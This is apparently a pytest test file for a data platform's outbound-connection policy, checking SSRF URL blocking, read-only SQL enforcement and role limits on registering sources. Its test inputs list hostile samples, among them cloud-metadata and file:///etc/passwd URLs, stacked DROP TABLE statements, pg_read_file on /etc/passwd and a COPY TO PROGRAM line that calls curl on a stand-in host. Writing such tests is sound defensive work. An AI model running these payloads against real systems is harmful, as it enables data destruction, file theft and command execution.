"""The two places a user's input becomes an outbound connection.

A data source is a URL somebody types and the server fetches, and a database
source is a connection string plus a statement. Both are the platform acting
on behalf of a user against a network the user may not be able to reach - so
both need a policy, and the policy needs tests that fail loudly if it is ever
relaxed by accident.
"""

from __future__ import annotations

import pytest

from app.modules.data.infrastructure.sql_guard import assert_read_only, safe_table_name
from app.shared.errors import ValidationError
from app.shared.outbound import NetworkPolicy, check_url

CLOSED = NetworkPolicy()
OPEN = NetworkPolicy(allow_private=True)


# --------------------------------------------------------------------------
# SSRF
# --------------------------------------------------------------------------
@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1:8080/admin",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",   # cloud metadata
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://10.0.0.5/internal",
        "http://192.168.1.1/",
        "http://172.16.0.1/",
    ],
)
def test_private_and_loopback_targets_are_refused(url):
    with pytest.raises(ValidationError) as raised:
        check_url(url, CLOSED)
    #  The message has to name what was resolved, or nobody can tell a policy
    #  refusal from a typo.
    assert "public address" in str(raised.value)


def test_a_non_http_scheme_is_refused():
    with pytest.raises(ValidationError):
        check_url("file:///etc/passwd", CLOSED)
    with pytest.raises(ValidationError):
        check_url("gopher://127.0.0.1:11211/", CLOSED)


def test_a_deployment_can_opt_in_to_its_own_network():
    #  The escape hatch exists, and it is explicit.
    assert check_url("http://10.0.0.5/internal", OPEN) == "10.0.0.5"


def test_a_named_host_can_be_allowed_without_opening_everything():
    policy = NetworkPolicy(allowed_hosts=("warehouse.internal",))
    assert check_url("http://warehouse.internal/data", policy) == "warehouse.internal"
    #  Allowing one host does not allow the rest of the network.
    with pytest.raises(ValidationError):
        check_url("http://10.0.0.5/", policy)


def test_a_public_address_passes():
    #  1.1.1.1 is a public address and needs no DNS to prove the point.
    assert check_url("https://1.1.1.1/", CLOSED) == "1.1.1.1"


# --------------------------------------------------------------------------
# read-only SQL
# --------------------------------------------------------------------------
@pytest.mark.parametrize(
    "query",
    [
        "SELECT id, name FROM customers",
        "select * from sales where price > 10",
        "WITH recent AS (SELECT * FROM orders) SELECT count(*) FROM recent",
        "SELECT * FROM t -- a trailing comment",
        "SELECT * FROM t;",
    ],
)
def test_reads_are_allowed(query):
    assert assert_read_only(query)


@pytest.mark.parametrize(
    "query",
    [
        "DELETE FROM customers",
        "DROP TABLE customers",
        "UPDATE customers SET name = 'x'",
        "INSERT INTO customers VALUES (1)",
        "SELECT * FROM t; DROP TABLE t",              # stacked statement
        "SELECT * INTO outfile '/tmp/x' FROM t",      # write disguised as a read
        "WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x",  # write inside a CTE
        "COPY t TO PROGRAM 'curl evil.example'",      # command execution
        "GRANT ALL ON t TO PUBLIC",
        "SELECT pg_read_file('/etc/passwd')",
        "",
        "   ",
        "-- everything is a comment",
    ],
)
def test_anything_that_is_not_a_plain_read_is_refused(query):
    with pytest.raises(ValidationError):
        assert_read_only(query)


def test_comments_cannot_smuggle_a_second_statement():
    #  The gate strips comments before counting statements, so hiding the
    #  semicolon behind one does not work either.
    with pytest.raises(ValidationError):
        assert_read_only("SELECT 1 /* harmless */; DROP TABLE t")


@pytest.mark.parametrize("name", ["customers", "public.customers", "sales_2026"])
def test_table_names_that_are_just_names_are_accepted(name):
    assert safe_table_name(name) == name


@pytest.mark.parametrize(
    "name",
    ["customers; DROP TABLE t", "customers WHERE 1=1", "../etc", "a b", "", "t--"],
)
def test_table_names_carrying_anything_else_are_refused(name):
    with pytest.raises(ValidationError):
        safe_table_name(name)


# --------------------------------------------------------------------------
# who may open a connection at all
# --------------------------------------------------------------------------
def test_an_editor_cannot_register_an_outbound_source(editor_client, api):
    """Uploading a CSV and pointing the server at a host are different powers."""
    for source_type, connection in (
        ("database", {"url": "postgresql://user:pw@db.example.com/warehouse"}),
        ("rest_api", {"url": "https://api.example.com/rows"}),
    ):
        response = editor_client.post(
            f"{api}/sources",
            json={
                "name": f"editor {source_type}",
                "type": source_type,
                "connection": connection,
            },
        )
        assert response.status_code == 403, response.text

    #  The same editor can still do ordinary data work.
    allowed = editor_client.post(
        f"{api}/sources",
        json={
            "name": "editor inline rows",
            "type": "inline",
            "connection": {"rows": [{"a": 1}]},
        },
    )
    assert allowed.status_code == 201, allowed.text


def test_an_admin_may_register_an_outbound_source(client, api):
    response = client.post(
        f"{api}/sources",
        json={
            "name": "admin rest source",
            "type": "rest_api",
            "connection": {"url": "https://api.example.com/rows"},
        },
    )
    #  Registering is allowed; whether the host answers is a separate question.
    assert response.status_code == 201, response.text
